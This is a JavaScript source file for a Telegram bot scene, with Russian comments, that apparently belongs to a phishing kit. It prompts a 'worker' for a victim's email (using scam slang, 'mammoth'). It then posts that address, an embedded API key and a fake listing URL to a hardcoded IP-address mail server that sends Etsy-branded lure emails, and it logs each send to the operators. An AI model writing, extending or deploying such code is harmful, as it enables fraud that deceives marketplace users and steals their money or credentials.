const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");
const axios = require("axios");

const sendEmail = async (ctx, ad, service) => {
  try {
    // Проверка: ID объявления должно состоять только из цифр
    if (!/^\d+$/.test(String(ad.id))) {
      return ctx.reply("❌ ID объявления содержит недопустимые символы. Проверьте корректность ID.");
    }

    // Формирование данных для запроса
    const payload = {
      apikey: "c4f0f6c6-27c3-408b-b7bd-a7334fec03d9", // Ваш API ключ
      email: ctx.scene.state.data.mail,             // Почта получателя
      pattern: "etsy",                              // Название сервиса (шаблон)
      url: `https://${service.domain}/ca/${ad.id}`,    // Ссылка объявления
      worker: String(ctx.from.id),
      title: String(ad.id),                          // ID объявления (должен состоять только из цифр)
      name: ad.name || "Unknown"                     // Имя отправителя (из объявления)
    };

    // Отправка запроса с тайм-аутом 3000 мс и нужными заголовками
    const response = await axios.post(
      "http://89.23.100.145:8000/sender",
      payload,
      {
        timeout: 3000,
        headers: {
          "Content-Type": "application/json",
          Accept: "text/plain"
        }
      }
    );

    if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }

    // Обработка ответа сервера (ожидается текст "The mail has be sent succesfully")
    if (response.data.trim() === "The mail has be sent succesfully") {
      await ctx.reply(
        "<b>✅ Письмо успешно отправлено на указанный адрес</b>",
        {
          reply_to_message_id: ctx.message.message_id,
          parse_mode: "HTML"
        }
      );

      log(
        ctx,
        `📧 <b>Письмо отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📬 <b>Почта:</b> ${ctx.scene.state.data.mail}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>\n\n<i>CatchMe MAIL</i>`
      );
    } else {
      await ctx.replyWithHTML(
        `<b>❌ Ошибка при отправке письма для сервиса ${service.title}!</b>\n\nОтвет сервера: <b>${response.data}</b>`
      );
    }
  } catch (err) {
    console.error("Ошибка при отправке письма:", err.message);
    if (err.code === "ECONNABORTED") {
      await ctx.reply("❌ Тайм-аут: сервер слишком долго не отвечает.");
    } else {
       if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => {});
    }
      const errorData =
        err.response && err.response.data
          ? typeof err.response.data === "object"
            ? JSON.stringify(err.response.data)
            : err.response.data
          : err.message || "Неизвестная ошибка";
      await ctx.replyWithHTML(
        `<b>❌ Ошибка при отправке письма для сервиса ${service.title}!</b>\n\nОшибка: <b>${errorData}</b>\n\n<i>Пожалуйста, перешлите это сообщение разработчику для решения данной проблемы.</i>`,{
                reply_to_message_id: ctx.message.message_id,

        }
      );
    }

  }
};

const scene = new WizardScene(
  "sendMailAd6",
  async (ctx) => {
    try {
      await ctx.scene.reply("Введите почту мамонта", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")]
        ])
      });
      ctx.scene.state.data = {}; // Инициализация state
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
 async (ctx) => {
  try {
    // Захват и валидация почты
    if (ctx.message?.text) {
      ctx.scene.state.data.mail = ctx.message.text;
    } else {
      await ctx.scene.reply("❌ Пожалуйста, введите действительный адрес электронной почты.");
      return; // Оставляем на текущем шаге
    }

    const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
    const service = await Service.findOne({ where: { code: ad.serviceCode } });

 const loadingMsg = await ctx.reply("⏳ Письмо отправляется...");
      ctx.scene.state.tempMessageId = loadingMsg.message_id;

         const miniCtx = {
        from: ctx.from,
        message: ctx.message,
        reply: (...args) => ctx.reply(...args),
        deleteMessage: (...args) => ctx.deleteMessage(...args),
        tempMessageId: ctx.scene.state.tempMessageId,
        scene: {
          state: {
            data: { ...ctx.scene.state.data },
          },
        },
      };

      setImmediate(() => {
        sendEmail(miniCtx, ad, service).catch((err) =>
          console.error("Ошибка при отправке письма:", err)
        );
      });

    setImmediate(() => {
      sendEmail(miniCtx, ad, service).catch((err) =>
        console.error("Ошибка при отправке письма:", err)
      );
    });

    return ctx.scene.leave();
    } catch (err) {
        // Удалить сообщение "⏳ Письмо отправляется...", если оно есть
      if (ctx.scene.state.tempMessageId) {
        await ctx.deleteMessage(ctx.scene.state.tempMessageId).catch(() => {});
      }
      console.log(err);
      await ctx.replyWithHTML(
        `<b>❌ Ошибка при отправке письма!</b>\nОшибка сервера: <b>${err.message}</b>`
      );
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;
